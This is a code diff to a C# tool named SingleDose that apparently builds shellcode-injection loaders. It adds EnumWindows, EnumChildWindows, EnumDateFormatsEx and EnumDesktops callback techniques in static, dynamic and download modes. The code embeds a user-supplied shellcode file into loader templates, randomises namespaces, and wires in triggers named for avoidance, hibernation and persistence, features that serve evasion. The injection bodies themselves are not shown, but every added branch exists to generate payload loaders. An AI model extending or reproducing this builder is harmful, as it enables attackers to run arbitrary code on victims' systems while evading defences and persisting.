@@ -628,6 +628,280 @@ namespace SingleDose
                         return false;
                     }
                 }
+                else if (injTechnique == "EnumWindows")
+                {
+                    string shellCodePath;
+                    Console.WriteLine("|   [~] Enter path to shellcode: ");
+                    do
+                    {
+                        Console.Write("|       > ");
+                        shellCodePath = Console.ReadLine();
+                    } while (!File.Exists(shellCodePath));
+
+                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
+                    string byteToString = "0x" + ByteArrayToString(shellCode);
+
+                    string CSContents = EnumWindows.Body;
+
+                    Regex regPattern;
+                    foreach (var trig in TriggersToUse)
+                    {
+                        if (trig == "REQUIRETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIRETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
+                        }
+
+                        if (trig == "HIBERNATETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
+                        }
+                        if (trig == "AVOIDTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
+                        }
+                        if (trig == "PERSISTTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
+                        }
+                    }
+
+                    //Clear remaining trigger.
+                    regPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    regPattern = new Regex("{{MODE}}");
+                    CSContents = regPattern.Replace(CSContents, EnumWindows.STATIC);
+                    regPattern = new Regex("{{SHELLCODE}}");
+                    CSContents = regPattern.Replace(CSContents, byteToString);
+                    regPattern = new Regex("{{NAMESPACE}}");
+                    CSContents = regPattern.Replace(CSContents, GenRandomString());
+                    regPattern = new Regex("{{ARGS}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+                else if (injTechnique == "EnumChildWindows")
+                {
+                    string shellCodePath;
+                    Console.WriteLine("|   [~] Enter path to shellcode: ");
+                    do
+                    {
+                        Console.Write("|       > ");
+                        shellCodePath = Console.ReadLine();
+                    } while (!File.Exists(shellCodePath));
+
+                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
+                    string byteToString = "0x" + ByteArrayToString(shellCode);
+
+                    string CSContents = EnumChildWindows.Body;
+
+                    Regex regPattern;
+                    foreach (var trig in TriggersToUse)
+                    {
+                        if (trig == "REQUIRETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIRETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
+                        }
+
+                        if (trig == "HIBERNATETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
+                        }
+                        if (trig == "AVOIDTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
+                        }
+                        if (trig == "PERSISTTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
+                        }
+                    }
+
+                    //Clear remaining trigger.
+                    regPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    regPattern = new Regex("{{MODE}}");
+                    CSContents = regPattern.Replace(CSContents, EnumChildWindows.STATIC);
+                    regPattern = new Regex("{{SHELLCODE}}");
+                    CSContents = regPattern.Replace(CSContents, byteToString);
+                    regPattern = new Regex("{{NAMESPACE}}");
+                    CSContents = regPattern.Replace(CSContents, GenRandomString());
+                    regPattern = new Regex("{{ARGS}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+                else if (injTechnique == "EnumDateFormatsEx")
+                {
+                    string shellCodePath;
+                    Console.WriteLine("|   [~] Enter path to shellcode: ");
+                    do
+                    {
+                        Console.Write("|       > ");
+                        shellCodePath = Console.ReadLine();
+                    } while (!File.Exists(shellCodePath));
+
+                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
+                    string byteToString = "0x" + ByteArrayToString(shellCode);
+
+                    string CSContents = EnumDateFormatsEx.Body;
+
+                    Regex regPattern;
+                    foreach (var trig in TriggersToUse)
+                    {
+                        if (trig == "REQUIRETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIRETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
+                        }
+
+                        if (trig == "HIBERNATETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
+                        }
+                        if (trig == "AVOIDTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
+                        }
+                        if (trig == "PERSISTTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
+                        }
+                    }
+
+                    //Clear remaining trigger.
+                    regPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    regPattern = new Regex("{{MODE}}");
+                    CSContents = regPattern.Replace(CSContents, EnumDateFormatsEx.STATIC);
+                    regPattern = new Regex("{{SHELLCODE}}");
+                    CSContents = regPattern.Replace(CSContents, byteToString);
+                    regPattern = new Regex("{{NAMESPACE}}");
+                    CSContents = regPattern.Replace(CSContents, GenRandomString());
+                    regPattern = new Regex("{{ARGS}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+                else if (injTechnique == "EnumDesktops")
+                {
+                    string shellCodePath;
+                    Console.WriteLine("|   [~] Enter path to shellcode: ");
+                    do
+                    {
+                        Console.Write("|       > ");
+                        shellCodePath = Console.ReadLine();
+                    } while (!File.Exists(shellCodePath));
+
+                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
+                    string byteToString = "0x" + ByteArrayToString(shellCode);
+                    string CSContents = EnumDesktops.Body;
+                    Regex regPattern;
+                    foreach (var trig in TriggersToUse)
+                    {
+                        if (trig == "REQUIRETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIRETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
+                        }
+
+                        if (trig == "HIBERNATETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
+                        }
+                        if (trig == "AVOIDTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
+                        }
+                        if (trig == "PERSISTTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
+                        }
+                    }
+                    //Clear remaining trigger.
+                    regPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    regPattern = new Regex("{{MODE}}");
+                    CSContents = regPattern.Replace(CSContents, EnumDesktops.STATIC);
+                    regPattern = new Regex("{{SHELLCODE}}");
+                    CSContents = regPattern.Replace(CSContents, byteToString);
+                    regPattern = new Regex("{{NAMESPACE}}");
+                    CSContents = regPattern.Replace(CSContents, GenRandomString());
+                    regPattern = new Regex("{{ARGS}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+
             }
             else if (injMode == "DYNAMIC")
             {
@@ -963,6 +1237,226 @@ namespace SingleDose
                     regPattern = new Regex("{{ARGS}}");
                     CSContents = regPattern.Replace(CSContents, FiberInject.DYNAMIC_ARGPARSE);
                     if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false)) 
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+                else if (injTechnique == "EnumWindows")
+                {
+                    string CSContents = EnumWindows.Body;
+                    Regex regPattern;
+                    foreach (var trig in TriggersToUse)
+                    {
+                        if (trig == "REQUIRETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIRETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
+                        }
+
+                        if (trig == "HIBERNATETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
+                        }
+                        if (trig == "AVOIDTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
+                        }
+                        if (trig == "PERSISTTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
+                        }
+                    }
+
+                    //Clear remaining trigger.
+                    regPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    regPattern = new Regex("{{MODE}}");
+                    CSContents = regPattern.Replace(CSContents, EnumWindows.DYNAMIC);
+                    regPattern = new Regex("{{NAMESPACE}}");
+                    CSContents = regPattern.Replace(CSContents, GenRandomString());
+                    regPattern = new Regex("{{ARGS}}");
+                    CSContents = regPattern.Replace(CSContents, EnumWindows.DYNAMIC_ARGPARSE);
+                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+                else if (injTechnique == "EnumChildWindows")
+                {
+                    string CSContents = EnumChildWindows.Body;
+                    Regex regPattern;
+                    foreach (var trig in TriggersToUse)
+                    {
+                        if (trig == "REQUIRETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIRETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
+                        }
+
+                        if (trig == "HIBERNATETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
+                        }
+                        if (trig == "AVOIDTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
+                        }
+                        if (trig == "PERSISTTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
+                        }
+                    }
+
+                    //Clear remaining trigger.
+                    regPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    regPattern = new Regex("{{MODE}}");
+                    CSContents = regPattern.Replace(CSContents, EnumChildWindows.DYNAMIC);
+                    regPattern = new Regex("{{NAMESPACE}}");
+                    CSContents = regPattern.Replace(CSContents, GenRandomString());
+                    regPattern = new Regex("{{ARGS}}");
+                    CSContents = regPattern.Replace(CSContents, EnumChildWindows.DYNAMIC_ARGPARSE);
+                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+                else if (injTechnique == "EnumDateFormatsEx")
+                {
+                    string CSContents = EnumDateFormatsEx.Body;
+                    Regex regPattern;
+                    foreach (var trig in TriggersToUse)
+                    {
+                        if (trig == "REQUIRETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIRETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
+                        }
+
+                        if (trig == "HIBERNATETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
+                        }
+                        if (trig == "AVOIDTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
+                        }
+                        if (trig == "PERSISTTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
+                        }
+                    }
+
+                    //Clear remaining trigger.
+                    regPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    regPattern = new Regex("{{MODE}}");
+                    CSContents = regPattern.Replace(CSContents, EnumDateFormatsEx.DYNAMIC);
+                    regPattern = new Regex("{{NAMESPACE}}");
+                    CSContents = regPattern.Replace(CSContents, GenRandomString());
+                    regPattern = new Regex("{{ARGS}}");
+                    CSContents = regPattern.Replace(CSContents, EnumDateFormatsEx.DYNAMIC_ARGPARSE);
+                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+                else if (injTechnique == "EnumDesktops")
+                {
+                    string CSContents = EnumDesktops.Body;
+                    Regex regPattern;
+                    foreach (var trig in TriggersToUse)
+                    {
+                        if (trig == "REQUIRETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIRETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
+                        }
+
+                        if (trig == "HIBERNATETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
+                        }
+                        if (trig == "AVOIDTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
+                        }
+                        if (trig == "PERSISTTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
+                        }
+                    }
+
+                    //Clear remaining trigger.
+                    regPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    regPattern = new Regex("{{MODE}}");
+                    CSContents = regPattern.Replace(CSContents, EnumDesktops.DYNAMIC);
+                    regPattern = new Regex("{{NAMESPACE}}");
+                    CSContents = regPattern.Replace(CSContents, GenRandomString());
+                    regPattern = new Regex("{{ARGS}}");
+                    CSContents = regPattern.Replace(CSContents, EnumDesktops.DYNAMIC_ARGPARSE);
+                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
                     {
                         return true;
                     }
@@ -1316,6 +1810,223 @@ namespace SingleDose
                         return false;
                     }
                 }
+                else if (injTechnique == "EnumWindows")
+                {
+                    string CSContents = EnumWindows.Body;
+                    Regex regPattern;
+                    foreach (var trig in TriggersToUse)
+                    {
+                        if (trig == "REQUIRETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIRETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
+                        }
+
+                        if (trig == "HIBERNATETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
+                        }
+                        if (trig == "AVOIDTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
+                        }
+                        if (trig == "PERSISTTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
+                        }
+                    }
+                    //Clear remaining trigger.
+                    regPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    regPattern = new Regex("{{MODE}}");
+                    CSContents = regPattern.Replace(CSContents, EnumWindows.DOWNLOAD);
+                    regPattern = new Regex("{{NAMESPACE}}");
+                    CSContents = regPattern.Replace(CSContents, GenRandomString());
+                    regPattern = new Regex("{{ARGS}}");
+                    CSContents = regPattern.Replace(CSContents, EnumWindows.DOWNLOAD_ARGPARSE);
+                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+                else if (injTechnique == "EnumChildWindows")
+                {
+                    string CSContents = EnumChildWindows.Body;
+                    Regex regPattern;
+                    foreach (var trig in TriggersToUse)
+                    {
+                        if (trig == "REQUIRETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIRETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
+                        }
+
+                        if (trig == "HIBERNATETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
+                        }
+                        if (trig == "AVOIDTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
+                        }
+                        if (trig == "PERSISTTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
+                        }
+                    }
+                    //Clear remaining trigger.
+                    regPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    regPattern = new Regex("{{MODE}}");
+                    CSContents = regPattern.Replace(CSContents, EnumChildWindows.DOWNLOAD);
+                    regPattern = new Regex("{{NAMESPACE}}");
+                    CSContents = regPattern.Replace(CSContents, GenRandomString());
+                    regPattern = new Regex("{{ARGS}}");
+                    CSContents = regPattern.Replace(CSContents, EnumChildWindows.DOWNLOAD_ARGPARSE);
+                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+                else if (injTechnique == "EnumDateFormatsEx")
+                {
+                    string CSContents = EnumDateFormatsEx.Body;
+                    Regex regPattern;
+                    foreach (var trig in TriggersToUse)
+                    {
+                        if (trig == "REQUIRETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIRETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
+                        }
+
+                        if (trig == "HIBERNATETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
+                        }
+                        if (trig == "AVOIDTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
+                        }
+                        if (trig == "PERSISTTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
+                        }
+                    }
+                    //Clear remaining trigger.
+                    regPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    regPattern = new Regex("{{MODE}}");
+                    CSContents = regPattern.Replace(CSContents, EnumDateFormatsEx.DOWNLOAD);
+                    regPattern = new Regex("{{NAMESPACE}}");
+                    CSContents = regPattern.Replace(CSContents, GenRandomString());
+                    regPattern = new Regex("{{ARGS}}");
+                    CSContents = regPattern.Replace(CSContents, EnumDateFormatsEx.DOWNLOAD_ARGPARSE);
+                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+                else if (injTechnique == "EnumDesktops")
+                {
+                    string CSContents = EnumDesktops.Body;
+                    Regex regPattern;
+                    foreach (var trig in TriggersToUse)
+                    {
+                        if (trig == "REQUIRETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIRETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
+                        }
+
+                        if (trig == "HIBERNATETRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATETRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
+                        }
+                        if (trig == "AVOIDTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
+                        }
+                        if (trig == "PERSISTTRIGGER")
+                        {
+                            regPattern = new Regex("{{TRIGGER}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTTRIGGER);
+                            regPattern = new Regex("{{REQUIREMENTS}}");
+                            CSContents = regPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
+                        }
+                    }
+                    //Clear remaining trigger.
+                    regPattern = new Regex("{{TRIGGER}}");
+                    CSContents = regPattern.Replace(CSContents, "");
+                    regPattern = new Regex("{{MODE}}");
+                    CSContents = regPattern.Replace(CSContents, EnumDesktops.DOWNLOAD);
+                    regPattern = new Regex("{{NAMESPACE}}");
+                    CSContents = regPattern.Replace(CSContents, GenRandomString());
+                    regPattern = new Regex("{{ARGS}}");
+                    CSContents = regPattern.Replace(CSContents, EnumDesktops.DOWNLOAD_ARGPARSE);
+                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+
             }
             return false;
         }
